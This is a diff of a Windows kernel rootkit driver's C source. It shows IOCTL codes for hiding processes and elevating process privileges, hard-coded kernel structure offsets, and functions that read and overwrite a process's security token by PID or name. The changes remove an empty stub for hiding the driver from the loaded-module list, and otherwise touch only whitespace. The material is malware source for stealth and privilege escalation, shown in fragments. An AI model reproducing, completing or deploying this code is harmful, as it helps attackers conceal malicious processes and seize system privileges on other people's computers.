@@ -6,7 +6,6 @@
 #define SIOCTL_TYPE 40000
 #define IOCTL_HIDE_PROCESS CTL_CODE(SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
 #define IOCTL_ELEVATION_PROCESS CTL_CODE(SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
-#define IOCTL_HIDE_ROOTKIT CTL_CODE(SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
 
 #define SYSTEM_PROCESS "System"
 #define PID_OFFSET 0x084
@@ -113,10 +112,6 @@ NTSTATUS IoControlFunction(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
 			Irp->IoStatus.Information = strlen(output);
 			break;
 
-		/* Hide the driver from the doubly-linked list MODULE_ENTRY */
-        case IOCTL_HIDE_ROOTKIT:
-            break;
-
 		default: 
             break;
 	}
@@ -151,7 +146,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegist
 	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
 		pDriverObject->MajorFunction[i] = OnStubDispatch;
     pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlFunction;		
-
+	
 	return STATUS_SUCCESS;
 }
 
@@ -258,7 +253,7 @@ unsigned long getProcessToken(char *id)
   PEPROCESS process;
   unsigned long  token_addr, token;
   int pid;
-            
+
   /* Search the process */
   if ((pid = atoi(id)) != 0) /* Search by PID */
      process = (PEPROCESS) searchProcessByPID(pid);
@@ -291,7 +286,7 @@ int setProcessToken(char *id, unsigned long token)
   else /* Search by name */
     process = (PEPROCESS) searchProcessByName(id);
   if (process == NULL)
-    return 1;
+    return 1; 
     
   /* Get the token address */
   token_addr = (unsigned long) process + TOKEN_OFFSET;
